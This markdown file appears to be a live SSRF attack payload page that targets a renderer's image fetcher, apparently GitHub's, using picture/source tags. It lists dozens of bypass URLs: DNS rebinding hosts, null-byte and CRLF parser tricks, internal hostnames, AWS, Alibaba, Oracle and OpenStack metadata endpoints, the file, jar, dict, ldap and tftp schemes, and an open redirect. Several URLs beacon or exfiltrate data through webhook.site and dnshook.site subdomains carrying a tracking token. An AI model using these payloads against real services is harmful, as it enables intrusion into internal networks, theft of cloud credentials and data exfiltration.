# 🔬 SSRF Tests v3 - Exotic Bypasses

## DNS Rebinding Setup
<!-- Using rebind domains that alternate between external and internal IPs -->

### 7f000001.1time.192.168.1.1.1time.repeat.rebind.it
<picture>
  <source srcset="http://7f000001.1time.192.168.1.1.1time.repeat.rebind.it/ssrf-rebind1">
  <img src="https://via.placeholder.com/1x1.png" alt="Rebind1">
</picture>

### a]@127.0.0.1
<picture>
  <source srcset="http://a]@127.0.0.1/ssrf-bracket">
  <img src="https://via.placeholder.com/1x1.png" alt="Bracket">
</picture>

### Null byte injection
<picture>
  <source srcset="http://127.0.0.1%00.webhook.site/ssrf-null">
  <img src="https://via.placeholder.com/1x1.png" alt="Null">
</picture>

### Backslash confusion
<picture>
  <source srcset="http://webhook.site\@127.0.0.1/ssrf-backslash">
  <img src="https://via.placeholder.com/1x1.png" alt="Backslash">
</picture>

### DNS TXT exfil
<picture>
  <source srcset="https://secret-data.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/dns-exfil">
  <img src="https://via.placeholder.com/1x1.png" alt="DNS Exfil">
</picture>

### IDNA/Punycode localhost
<picture>
  <source srcset="http://xn--localhost-bif/ssrf-puny">
  <img src="https://via.placeholder.com/1x1.png" alt="Punycode">
</picture>

### IPv6 zone ID
<picture>
  <source srcset="http://[::1%25eth0]/ssrf-zone">
  <img src="https://via.placeholder.com/1x1.png" alt="Zone">
</picture>

### HTTP 0.9
<picture>
  <source srcset="http://127.0.0.1:80/ssrf-http09">
  <img src="https://via.placeholder.com/1x1.png" alt="HTTP09">
</picture>

### Port 0
<picture>
  <source srcset="http://127.0.0.1:0/ssrf-port0">
  <img src="https://via.placeholder.com/1x1.png" alt="Port0">
</picture>

### Very long subdomain exfil
<picture>
  <source srcset="https://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/long-subdomain">
  <img src="https://via.placeholder.com/1x1.png" alt="Long">
</picture>

### Dotless domain (intranet)
<picture>
  <source srcset="http://intranet/ssrf-intra">
  <img src="https://via.placeholder.com/1x1.png" alt="Intranet">
</picture>

<picture>
  <source srcset="http://corp/ssrf-corp">
  <img src="https://via.placeholder.com/1x1.png" alt="Corp">
</picture>

<picture>
  <source srcset="http://internal/ssrf-internal">
  <img src="https://via.placeholder.com/1x1.png" alt="Internal">
</picture>

### Link-local IPv4 (APIPA)
<picture>
  <source srcset="http://169.254.1.1/ssrf-apipa">
  <img src="https://via.placeholder.com/1x1.png" alt="APIPA">
</picture>

### Unique local IPv6
<picture>
  <source srcset="http://[fd00::1]/ssrf-ula">
  <img src="https://via.placeholder.com/1x1.png" alt="ULA">
</picture>

### Windows UNC path
<picture>
  <source srcset="file://127.0.0.1/c$/ssrf-unc">
  <img src="https://via.placeholder.com/1x1.png" alt="UNC">
</picture>

### jar: protocol
<picture>
  <source srcset="jar:http://127.0.0.1!/test.jpg">
  <img src="https://via.placeholder.com/1x1.png" alt="JAR">
</picture>

### data: URL with fetch
<picture>
  <source srcset="data:text/html,<script>fetch('http://127.0.0.1')</script>">
  <img src="https://via.placeholder.com/1x1.png" alt="Data">
</picture>

### Wildcard cert bypass domains
<picture>
  <source srcset="http://127.0.0.1.xip.io/ssrf-xip">
  <img src="https://via.placeholder.com/1x1.png" alt="XIP">
</picture>

<picture>
  <source srcset="http://www.127.0.0.1.xip.io/ssrf-xip2">
  <img src="https://via.placeholder.com/1x1.png" alt="XIP2">
</picture>

### GitHub internal domains guess
<picture>
  <source srcset="http://github.localhost/ssrf-gh-local">
  <img src="https://via.placeholder.com/1x1.png" alt="GH Local">
</picture>

<picture>
  <source srcset="http://camo.github.com/ssrf-camo-gh">
  <img src="https://via.placeholder.com/1x1.png" alt="Camo GH">
</picture>

<picture>
  <source srcset="http://assets.github.com/ssrf-assets">
  <img src="https://via.placeholder.com/1x1.png" alt="Assets">
</picture>

### Protocol downgrade HTTP -> FTP
<picture>
  <source srcset="ftp://anonymous@ftp.gnu.org/ssrf-ftp">
  <img src="https://via.placeholder.com/1x1.png" alt="FTP">
</picture>

### TFTP
<picture>
  <source srcset="tftp://127.0.0.1/ssrf-tftp">
  <img src="https://via.placeholder.com/1x1.png" alt="TFTP">
</picture>

### Dict protocol
<picture>
  <source srcset="dict://127.0.0.1:11211/stat">
  <img src="https://via.placeholder.com/1x1.png" alt="Dict">
</picture>

### LDAP
<picture>
  <source srcset="ldap://127.0.0.1/ssrf-ldap">
  <img src="https://via.placeholder.com/1x1.png" alt="LDAP">
</picture>

### IPv4 in IPv6 bracket notation
<picture>
  <source srcset="http://[127.0.0.1]/ssrf-v4bracket">
  <img src="https://via.placeholder.com/1x1.png" alt="V4Bracket">
</picture>

### Space in hostname
<picture>
  <source srcset="http://127.0.0.1%20.webhook.site/ssrf-space">
  <img src="https://via.placeholder.com/1x1.png" alt="Space">
</picture>

### Carriage return
<picture>
  <source srcset="http://127.0.0.1%0d%0a.webhook.site/ssrf-crlf">
  <img src="https://via.placeholder.com/1x1.png" alt="CRLF">
</picture>

### Escaped dot
<picture>
  <source srcset="http://127%2e0%2e0%2e1/ssrf-escdot">
  <img src="https://via.placeholder.com/1x1.png" alt="EscDot">
</picture>

### Google open redirect
<picture>
  <source srcset="https://www.google.com/url?q=http://127.0.0.1/&sa=D">
  <img src="https://via.placeholder.com/1x1.png" alt="Google Redirect">
</picture>

### Mix case protocol
<picture>
  <source srcset="hTtP://127.0.0.1/ssrf-mixcase">
  <img src="https://via.placeholder.com/1x1.png" alt="MixCase">
</picture>

### Triple slash
<picture>
  <source srcset="http:///127.0.0.1/ssrf-triple">
  <img src="https://via.placeholder.com/1x1.png" alt="Triple">
</picture>

### No protocol
<picture>
  <source srcset="//127.0.0.1/ssrf-noprotocol">
  <img src="https://via.placeholder.com/1x1.png" alt="NoProto">
</picture>

### AWS EC2 Instance connect
<picture>
  <source srcset="http://169.254.169.254/latest/api/token">
  <img src="https://via.placeholder.com/1x1.png" alt="EC2Token">
</picture>

### Alibaba Cloud metadata
<picture>
  <source srcset="http://100.100.100.200/latest/meta-data/">
  <img src="https://via.placeholder.com/1x1.png" alt="Alibaba">
</picture>

### Oracle Cloud metadata
<picture>
  <source srcset="http://169.254.169.254/opc/v1/instance/">
  <img src="https://via.placeholder.com/1x1.png" alt="Oracle">
</picture>

### OpenStack metadata
<picture>
  <source srcset="http://169.254.169.254/openstack/latest/meta_data.json">
  <img src="https://via.placeholder.com/1x1.png" alt="OpenStack">
</picture>

### Webhook tracker
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/round3/tracker">
  <img src="https://via.placeholder.com/1x1.png" alt="Tracker">
</picture>

---
**Token:** `b45a05ce-3f7d-4a49-9e5d-5a138dde5eca`
